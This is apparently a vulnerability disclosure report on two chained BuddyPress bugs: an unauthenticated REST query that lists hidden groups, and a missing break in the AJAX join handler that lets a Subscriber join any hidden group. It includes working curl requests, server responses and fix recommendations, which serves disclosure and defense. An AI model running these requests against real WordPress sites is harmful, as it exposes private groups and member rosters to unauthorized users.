## TL;DR
Two separate bugs in BuddyPress chain into a full hidden-group takeover with no prior access. First: the REST groups endpoint leaks hidden groups to anyone who asks with `?status=hidden` — no login required. Second: the join handler's capability check fails correctly, but a missing `break` lets `groups_join_group()` run anyway. Combine them and a fresh Subscriber account finds any hidden group on the site and becomes a full member in two requests.

**Anonymous enumeration + broken join handler = hidden group fully compromised.**

## Environment
| Component | Version |
|---|---|
| WordPress | 7.1.2 |
| BuddyPress | 14.5.2 (exact zip reviewed: https://downloads.wordpress.org/plugin/buddypress.14.5.2.zip) |
| PHP | 8.4.24 (cli) |
| MariaDB | 11.8.8-MariaDB (Debian) |

## Description
Hidden groups should be invisible to non-members and joinable only by invitation. The groups directory discloses hidden groups to anyone requesting that status, and a missing `break` in the join handler lets a rejected join succeed anyway. Chained, an attacker with no prior access can find a hidden group and become a full member in two requests.

## Root Cause

- **Hidden Group Disclosure Bug** — `bp-groups/classes/class-bp-groups-group.php:1167`: a caller-supplied `status` filter (reachable via the REST `?status=hidden` param or the groups-directory `$_GET['status']`) drops the hidden-group exclusion filter entirely.
- **Join Authorization Bypass Bug** — `bp-templates/bp-legacy/buddypress-functions.php:1640`: missing `break` after a failed capability check lets `groups_join_group()` execute regardless of the result.

## Steps to Reproduce

**Privilege level:** Step 1 is fully anonymous. Steps 2–3 use a freshly self-registered WordPress account, default Subscriber role (`chainattacker`) — not a BuddyPress moderator, not a member of any group, never invited.

---

**Step 1 — Anonymous: enumerate all hidden groups via the REST API**

```bash
curl -s -i "https://target.example.com/wp-json/buddypress/v1/groups?status=hidden"
```

```json
HTTP/1.1 200 OK
X-WP-Total: 2
[{"id":3,...,"name":"Confidential Group","slug":"confidential-group","status":"hidden",...},
 {"id":1,"creator_id":3,"description":{"raw":"hidden group for testing",...},"name":"Secret Society","slug":"secret-society","status":"hidden","total_member_count":0,...}]
```

No login, no cookies. The numeric ID, name, slug, creator, and private group description are returned for every hidden group on the site.

---

**Step 2 — Subscriber: join a hidden group using the discovered ID**

Harvest a nonce from the Join-Group link on any unrelated public group — the nonce action is a constant, not bound to any group ID.

```bash
curl -s -i -b chainattacker_cookies.txt -X POST \
  "https://target.example.com/wp-admin/admin-ajax.php" \
  --data "action=joinleave_group&gid=1&_wpnonce=70b0d2e492"
```

```
HTTP/1.1 200 OK
Error joining group<a id="group-1" class="group-button leave-group" rel="leave" href="https://target.example.com/groups/secret-society/leave-group/?_wpnonce=cd5e0dafa7">Leave Group</a>
```

"Error joining group" confirms the capability check correctly failed — but the "Leave Group" link that follows is rendered only after `groups_join_group()` succeeds. The error message and the Leave Group link cannot coexist unless the join went through.

---

**Step 3 — Verify full member access**

```bash
curl -s -i -b chainattacker_cookies.txt "https://target.example.com/groups/secret-society/"
curl -s -i -b chainattacker_cookies.txt "https://target.example.com/groups/secret-society/members/"
```

```
HTTP/1.1 200 OK
<title>Home - Secret Society - BP Test Site</title>
...Leave Group...

HTTP/1.1 200 OK
<a href="https://target.example.com/members/chainattacker/">chainattacker</a>
<a href="https://target.example.com/members/attacker/">attacker</a>
<a href="https://target.example.com/members/victim/">victim</a>
```

Both pages return 200 with full member-only content — including the private member roster, which now lists `chainattacker` alongside every other real member.

## Recommendation
- **Hidden Group Disclosure Bug:** Enforce the hidden-group exclusion regardless of the `status` param, on both the template-layer query (`bp_has_groups()`) and the REST collection endpoint.
- **Join Authorization Bypass Bug:** Add `break;` after the failed capability check in `bp_legacy_theme_ajax_joinleave_group()`; bind the join nonce to the specific group ID.

## Impact
Starting from zero — no account for step 1, only a Subscriber account for step 2 — an attacker gains full membership in any hidden group on the site. No admin cooperation, no invitation, and no prior knowledge of the group required.

### **Note: This issue was reported via HackerOne and marked as a duplicate of a prior report — meaning it was already known to the maintainers at the time of submission.**
